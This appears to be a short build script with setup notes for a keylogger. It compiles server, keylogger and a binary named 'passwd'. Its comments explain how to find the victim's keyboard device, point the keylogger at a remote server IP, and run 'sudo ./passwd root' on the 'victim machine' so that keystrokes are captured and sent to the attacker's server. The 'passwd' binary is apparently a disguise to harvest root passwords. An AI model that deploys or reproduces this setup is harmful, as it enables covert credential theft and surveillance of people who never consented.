
gcc server.c -o server
gcc keylogger.c -o keylogger
gcc passwd.c -o passwd

###before run###

#1. use `sudo evtest`` to find out your keyborad event: /dev/input/eventX (determine which X is your keyword), and modify the keylogger.c `#define DEVICE "/dev/input/event1"`
#2. identify your remote server ip, and modify the keylogger.c `#define SERVER_IP "YOUR_IP"   `
#3. compile your code by `source compile.sh`

### To run ###

# On your server machine, open a terminal and run: `./server`
# On your victim machine, open a terminal and run: `sudo ./passwd root`